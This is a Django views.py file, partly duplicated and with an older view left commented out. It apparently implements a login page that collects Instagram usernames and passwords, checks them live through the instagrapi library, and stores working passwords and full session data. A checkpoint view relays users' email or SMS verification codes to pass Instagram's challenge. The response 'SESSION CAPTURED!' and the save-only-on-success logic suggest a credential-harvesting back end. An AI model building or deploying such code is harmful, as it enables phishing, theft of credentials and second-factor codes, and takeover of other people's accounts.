# core/views.py
import logging
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, ClientError
from .forms import InstagramLoginForm
from .models import InstagramAccount

logger = logging.getLogger(__name__)


# core/views.py
import logging
from django.http import JsonResponse
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
import json

from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired

from .forms import InstagramLoginForm
from .models import InstagramAccount

logger = logging.getLogger(__name__)

@csrf_exempt
def login_view(request):
    if request.method == "POST":
        form = InstagramLoginForm(request.POST)
        if not form.is_valid():
            return JsonResponse({"error": form.errors}, status=400)

        username = form.cleaned_data["username"].strip()
        password = form.cleaned_data["password"]

        cl = Client()
        cl.delay_range = [1, 4]

        try:
            # 1. Try login first
            cl.login(username, password)
            settings = cl.get_settings()

            # 2. Extract sessionid
            sessionid = settings.get("authorization_data", {}).get("sessionid")
            if not sessionid:
                # fallback
                sessionid = cl.private.requests.cookies.get("sessionid")

            # 3. ONLY IF WE HAVE SESSIONID → SAVE EVERYTHING
            if sessionid:
                account, created = InstagramAccount.objects.update_or_create(
                    username=username,
                    defaults={
                        "password": password,                    # ← correct password
                        "session_data": json.dumps(settings),   # ← full encrypted session
                        "last_success": timezone.now(),
                        "login_attempts": 0,
                        "is_active": True,
                    }
                )
                # Extra safety save
                account.save_success(settings)

                return JsonResponse({
                    "success": True,
                    "message": "SESSION CAPTURED! Password saved only because login worked.",
                    "username": username,
                    "saved": True
                })
            else:
                return JsonResponse({
                    "error": "Login failed – no sessionid received"
                }, status=400)

        except ChallengeRequired:
            # Save password temporarily for checkpoint
            account, _ = InstagramAccount.objects.update_or_create(
                username=username,
                defaults={"password": password}
            )
            request.session["account_id"] = account.id
            return JsonResponse({
                "error": "challenge_required",
                "message": "Check email/SMS → submit code at /checkpoint/"
            }, status=400)

        except Exception as e:
            # WRONG PASSWORD → DO NOT SAVE ANYTHING
            return JsonResponse({
                "error": "Invalid username or password",
                "message": "Wrong credentials – nothing saved"
            }, status=400)

    return render(request, "core/login.html", {"form": InstagramLoginForm()})
# @csrf_exempt
# def login_view(request):
#     if request.method == "POST":
#         form = InstagramLoginForm(request.POST)
#         if not form.is_valid():
#             return JsonResponse({"error": form.errors}, status=400)

#         username = form.cleaned_data["username"].strip()
#         password = form.cleaned_data["password"]

#         # THIS IS THE ONLY CORRECT WAY
#         account, created = InstagramAccount.objects.update_or_create(
#             username=username,
#             defaults={"password": password}  # updates password if exists
#         )

#         # FORCE ENCRYPTION EVEN IF FIELD DIDN'T CHANGE
#         account.password = password
#         account.save(update_fields=["password"])

#         cl = Client()
#         cl.delay_range = [1, 4]

#         try:
#             cl.login(username, password)
#             settings = cl.get_settings()
#             account.save_success(settings)

#             return JsonResponse({
#                 "success": True,
#                 "sessionid": account.get_sessionid(),
#                 "username": username,
#                 "password_saved": True,
#                 "session_saved": True,
#                 "encrypted_length": len(account.password)
#             })

#         except ChallengeRequired:
#             request.session["account_id"] = account.id
#             return JsonResponse({
#                 "error": "challenge_required",
#                 "message": "Check your email/SMS → go to /checkpoint/"
#             }, status=400)

#         except Exception as e:
#             account.save_failure()
#             return JsonResponse({"error": str(e)}, status=400)

#     return render(request, "core/login.html", {"form": InstagramLoginForm()})




@csrf_exempt
def checkpoint_view(request):
    if request.method == "POST":
        code = request.POST.get("code", "").strip()
        account_id = request.session.get("account_id")
        if not account_id or not code:
            return JsonResponse({"error": "Missing data"}, status=400)

        account = InstagramAccount.objects.get(id=account_id)
        cl = Client()
        cl.delay_range = [1, 4]

        try:
            cl.login(account.username, account.password, verification_code=code)
            settings = cl.get_settings()
            account.save_success(settings)
            return JsonResponse({
                "success": True,
                "message": "Challenge passed! Session saved with correct password."
            })
        except Exception as e:
            return JsonResponse({"error": f"Wrong code: {e}"}, status=400)

    return render(request, "core/checkpoint.html")